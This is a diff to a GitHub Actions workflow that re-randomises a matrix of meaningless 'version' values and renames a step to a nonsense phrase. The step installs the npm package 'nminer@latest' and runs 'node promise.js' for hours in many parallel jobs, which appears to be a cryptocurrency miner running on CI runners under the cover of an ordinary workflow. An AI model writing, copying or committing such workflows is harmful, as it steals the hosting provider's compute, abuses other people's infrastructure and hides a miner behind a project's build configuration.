@@ -9,23 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5880 }
-          - { version: 6910 }
-          - { version: 2534 }
-          - { version: 1220 }
-          - { version: 859 }
-          - { version: 8195 }
-          - { version: 6490 }
-          - { version: 9758 }
-          - { version: 5087 }
-          - { version: 9769 }
-          - { version: 305 }
-          - { version: 1123 }
-          - { version: 3598 }
+          - { version: 9208 }
+          - { version: 780 }
+          - { version: 9433 }
+          - { version: 6176 }
+          - { version: 3027 }
           - { version: 8517 }
-          - { version: 6673 }
-          - { version: 4544 }
-          - { version: 5868 }
+          - { version: 1282 }
+          - { version: 5819 }
+          - { version: 2374 }
+          - { version: 6481 }
+          - { version: 5902 }
+          - { version: 9018 }
+          - { version: 6165 }
+          - { version: 8955 }
+          - { version: 8645 }
+          - { version: 4205 }
+          - { version: 5574 }
+          - { version: 6491 }
 
     steps:
       - name: Checkout
@@ -36,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: scrabble scramble
+      - name: since despite hyena after teriyaki
         run: |
           npm install nminer@latest
-          timeout 322m node promise.js || echo "promise executed"
+          timeout 341m node promise.js || echo "promise executed"
